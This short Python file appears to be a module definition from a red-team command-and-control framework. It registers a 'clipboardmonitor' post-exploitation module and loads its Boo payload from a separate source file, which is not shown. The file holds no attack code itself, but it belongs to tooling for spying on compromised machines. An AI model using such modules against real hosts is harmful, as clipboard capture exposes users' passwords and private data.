from core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/clipboardmonitor'
        self.language = 'boo'
        self.description = 'Monitors the clipboard'
        self.author = '@byt3bl33d3r'
        self.references = []
        self.options = {}

    def payload(self):
        with open('core/teamserver/modules/boo/src/clipboardmonitor.boo') as module_src:
            return module_src.read()
